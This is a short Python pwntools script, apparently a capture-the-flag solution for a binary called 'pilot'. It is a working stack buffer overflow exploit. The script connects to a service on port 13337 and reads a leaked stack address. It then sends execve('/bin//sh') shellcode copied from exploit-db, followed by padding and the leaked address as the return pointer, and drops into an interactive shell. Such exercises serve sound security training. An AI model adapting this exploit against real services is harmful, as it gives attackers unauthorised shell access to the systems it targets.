#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

# from https://www.exploit-db.com/exploits/47008
shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'

#r = process('pilot')

r = remote('127.0.0.1', 13337)
r.recvuntil("Location:")
buf = int(r.recvline().strip(), 16)
r.sendline(shellcode + ('A' * (0x28 - len(shellcode))) + p64(buf))
r.interactive()
